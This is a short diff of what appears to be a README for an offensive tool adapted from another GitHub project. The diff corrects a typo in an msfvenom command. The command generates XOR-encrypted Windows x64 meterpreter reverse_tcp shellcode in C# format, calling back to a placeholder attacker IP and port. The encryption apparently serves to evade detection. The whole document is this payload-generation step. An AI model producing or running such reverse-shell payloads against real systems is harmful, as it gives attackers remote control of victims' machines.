@@ -7,7 +7,7 @@ this is a modified code(the original code is from https://github.com/chr0n1k/AH2
 
 to generate shellcode use:
 
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IPADRESS> lport=<PORTNUMBER> -f csharp --encrytp xor --encryptkey ARICAHACKON
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IPADRESS> lport=<PORTNUMBER> -f csharp --encrypt xor --encryptkey ARICAHACKON
 
 
 
